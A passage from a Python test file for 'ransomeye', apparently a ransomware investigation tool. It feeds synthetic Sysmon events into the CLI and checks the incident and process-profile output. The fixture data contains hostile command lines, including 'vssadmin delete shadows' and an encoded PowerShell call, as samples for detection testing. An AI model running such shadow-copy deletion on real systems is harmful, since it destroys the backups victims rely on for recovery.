    assert "Incident ID: INC-TEST-100" in out
    assert "Case: CASE-INC" in out
    assert "Timeframe: 2026-08-08T14:59:00Z -> 2026-08-08T15:00:00Z" in out

    assert f"Finding ID: {hash_id}" in out
    assert "Type: suspicious_powershell" in out
    assert "Technique: T1059.001" in out

    # Chronological sort check: EVT-INC-02 should appear before EVT-INC-01
    idx1 = out.find("EVT-INC-02")
    idx2 = out.find("EVT-INC-01")
    assert idx1 != -1 and idx2 != -1
    assert idx1 < idx2

    # Missing evidence check
    assert "Evidence not available: EVT-MISSING" in out

    # 2. Missing incident fails
    with patch.object(sys, "argv", ["ransomeye", "investigation", "incident", "--database", str(db_path), "--case", "CASE-INC", "--incident", "INC-MISSING"]):
        try:
            main()
            assert False, "Should have exited"
        except SystemExit as e:
            assert e.code == 1
    out, err = capsys.readouterr()
    assert "Incident not found in latest assessment: INC-MISSING" in out

    # 3. No findings/evidence handled
    with patch.object(sys, "argv", ["ransomeye", "investigation", "incident", "--database", str(db_path), "--case", "CASE-INC", "--incident", "INC-TEST-OTHER"]):
        main()
    out, err = capsys.readouterr()

    assert "--- FINDINGS (0) ---" in out
    # Actually wait, my code prints --- FINDINGS (0) --- followed by "None"
    assert "--- EVIDENCE (0) ---" in out


def test_command_investigation_process(tmp_path, capsys):
    from ransomeye.commands import main
    from ransomeye.storage import EvidenceStore
    import sys
    from unittest.mock import patch

    db_path = tmp_path / "cli_process.db"
    store = EvidenceStore(db_path)
    store.create_case("CASE-PROC", "CLI Process Test")

    # A parent process
    event_1 = {
        "event_id": "EVT-PROC-01",
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "cmd.exe",
        "command_line": "cmd.exe /c start",
        "pid": 100,
        "process_guid": "{CMD-GUID}",
        "image_path": "C:\\Windows\\System32\\cmd.exe",
    }

    # A target child process
    event_2 = {
        "event_id": "EVT-PROC-02",
        "timestamp": "2026-08-08T15:01:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -enc XYZ",
        "pid": 200,
        "parent_pid": 100,
        "process_guid": "{PS-GUID}",
        "parent_process_guid": "{CMD-GUID}",
        "image_path": "C:\\Windows\\System32\\powershell.exe",
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
    }

    # Target process spawns a child
    event_3 = {
        "event_id": "EVT-PROC-03",
        "timestamp": "2026-08-08T15:02:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "vssadmin.exe",
        "command_line": "vssadmin delete shadows",
        "pid": 300,
        "parent_pid": 200,
        "process_guid": "{VSS-GUID}",
        "parent_process_guid": "{PS-GUID}",
    }

    # Target process creates a file
    event_4 = {
        "event_id": "EVT-PROC-04",
        "timestamp": "2026-08-08T15:03:00Z",
        "source": "sysmon",
        "event_type": "file_create",
        "process_name": "powershell.exe",
        "pid": 200,
        "process_guid": "{PS-GUID}",
        "file_path": "C:\\Users\\Analyst\\README.txt",
    }

    # Target process network connection
    event_5 = {
        "event_id": "EVT-PROC-05",
        "timestamp": "2026-08-08T15:04:00Z",
        "source": "sysmon",
        "event_type": "network_connect",
        "process_name": "powershell.exe",
        "pid": 200,
        "process_guid": "{PS-GUID}",
        "network": {
            "destination_ip": "203.0.113.55",
            "destination_port": "443",
            "protocol": "tcp"
        }
    }

    store.save_event("CASE-PROC", event_1)
    store.save_event("CASE-PROC", event_2)
    store.save_event("CASE-PROC", event_3)
    store.save_event("CASE-PROC", event_4)
    store.save_event("CASE-PROC", event_5)

    store.save_finding(
        case_id="CASE-PROC",
        finding={
            "type": "suspicious_powershell",
            "score": 40,
            "confidence": 0.8,
            "technique": "T1059.001",
            "reason": "Encoded powershell",
        },
        event_ids=["EVT-PROC-02"],
    )

    store.close()

    # Test exact GUID lookup
    with patch.object(sys, "argv", ["ransomeye", "investigation", "process", "--database", str(db_path), "--case", "CASE-PROC", "--process", "{PS-GUID}"]):
        main()
    out, err = capsys.readouterr()

    assert "RANSOMEYE PROCESS PROFILE" in out
    assert "Case: CASE-PROC" in out
    assert "Process: powershell.exe" in out
    assert "PID: 200" in out
    assert "GUID: {PS-GUID}" in out
    assert "Image: unavailable" in out
    assert "Command Line: powershell.exe -enc XYZ" in out
    assert "Timestamp: 2026-08-08 15:01:00+00:00" in out

    assert "Parent: cmd.exe (PID 100) [{CMD-GUID}]" in out

    assert "--- CHILDREN (1) ---" in out
    assert "- vssadmin.exe (PID 300) [{VSS-GUID}] - SPAWNED" in out

    assert "--- FILES TOUCHED (1) ---" in out
    assert "- CREATED: C:\\Users\\Analyst\\README.txt" in out

    assert "--- NETWORK CONNECTIONS (1) ---" in out
    assert "- CONNECTED: 203.0.113.55:443 [tcp]" in out

    assert "--- ASSOCIATED FINDINGS (1) ---" in out
    assert "suspicious_powershell" in out

    # Test exact PID lookup
    with patch.object(sys, "argv", ["ransomeye", "investigation", "process", "--database", str(db_path), "--case", "CASE-PROC", "--process", "100"]):
        main()
    out, err = capsys.readouterr()

    assert "Process: cmd.exe" in out
    assert "PID: 100" in out

    # Test Not Found
    with patch.object(sys, "argv", ["ransomeye", "investigation", "process", "--database", str(db_path), "--case", "CASE-PROC", "--process", "9999"]):
        try:
            main()
        except SystemExit as e:
            assert e.code == 1
    out, err = capsys.readouterr()
    assert "Process not found in case: 9999" in out
